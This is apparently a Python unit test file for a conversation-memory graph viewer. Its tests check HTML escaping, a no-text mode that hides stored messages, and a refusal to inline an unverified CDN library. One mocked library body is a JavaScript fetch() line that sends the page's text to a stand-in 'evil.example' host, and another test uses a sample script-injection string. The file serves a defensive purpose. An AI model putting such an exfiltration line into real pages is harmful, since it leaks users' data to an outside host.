"""turnbook-view draws the association graph; with --no-text the page holds no conversation."""
import _isolate  # noqa: F401  (first: never touch the real ~/.turnbook)
from pathlib import Path
import tempfile
import unittest

from turnbook import memory_view
from turnbook.associative_memory import AssociativeMemoryIndex
from turnbook.conversation_memory import ConversationMemoryStore

TEXTS = ["콩이랑 해변 산책 다녀옴", "콩이 사료 바꿨더니 잘 먹네", "서버 배포 스크립트 고쳤다",
         "배포 서버 포트 54329로 고정", "점심은 김치찌개", "콩이 병원 예약 금요일"]


class BrainViewTests(unittest.TestCase):
    def test_timeline_reads_work_without_waiting_for_association_index(self):
        with tempfile.TemporaryDirectory() as directory:
            db = Path(directory) / "brain.sqlite"
            with ConversationMemoryStore(db) as store:
                store.record({"turn_id": "work", "client": "codex", "client_session_id": "s",
                              "scope": "project:test", "role": "assistant",
                              "content_redacted": "Did: edited login.py <script>bad()</script>",
                              "raw_sha256": "work", "source_path": "p", "source_ordinal": 1,
                              "happened_at": "2026-11-02T10:00:00",
                              "known_at": "2026-11-02T10:00:00"})
            timeline = memory_view.read_timeline(db, 10, True)
            self.assertTrue(timeline[0]["work"])
            self.assertEqual(timeline[0]["app"], "codex")
            self.assertEqual(memory_view.read_timeline(db, 10, False), [])
            page = Path(directory) / "brain.html"
            memory_view.build(db, page, inline_library=False)
            self.assertNotIn("<script>bad()</script>", page.read_text(encoding="utf-8"))
            self.assertIn("edited login.py", page.read_text(encoding="utf-8"))

    def test_graph_page_with_and_without_text(self):
        with tempfile.TemporaryDirectory() as directory:
            db = Path(directory) / "brain.sqlite"
            with ConversationMemoryStore(db) as store:
                for i, text in enumerate(TEXTS):
                    when = f"2026-10-0{1 + i}T10:00:00"
                    store.record({"turn_id": f"t{i}", "client": "codex", "client_session_id": "s",
                                  "scope": "global", "role": "user", "content_redacted": text,
                                  "raw_sha256": f"t{i}", "source_path": "p", "happened_at": when,
                                  "known_at": when, "source_ordinal": i})
            with AssociativeMemoryIndex(db) as index:
                index.sync_sources(limit=1000)
            page = Path(directory) / "brain.html"
            shown = memory_view.build(db, page, inline_library=False)
            self.assertEqual(shown["nodes"], len(TEXTS))
            self.assertGreater(shown["links"], 0)
            self.assertIn("김치찌개", page.read_text(encoding="utf-8"))
            memory_view.build(db, page, with_text=False, inline_library=False)
            html = page.read_text(encoding="utf-8")
            self.assertFalse(any(text in html for text in TEXTS))
            self.assertNotIn("콩이", html)              # nor the topic words of a region
            self.assertNotIn("54329", html)

    def test_a_library_that_is_not_the_checked_one_never_runs_inline(self):
        from unittest import mock
        served = mock.MagicMock()
        served.read.return_value = b"fetch('https://evil.example/?m=' + document.body.innerText)"
        with mock.patch("urllib.request.urlopen", return_value=served):
            tag = memory_view._library_tag(inline=True)
        self.assertNotIn("evil.example", tag)
        self.assertIn(memory_view.LIBRARY_SRI, tag, "the browser checks the CDN's copy too")


if __name__ == "__main__":
    unittest.main()
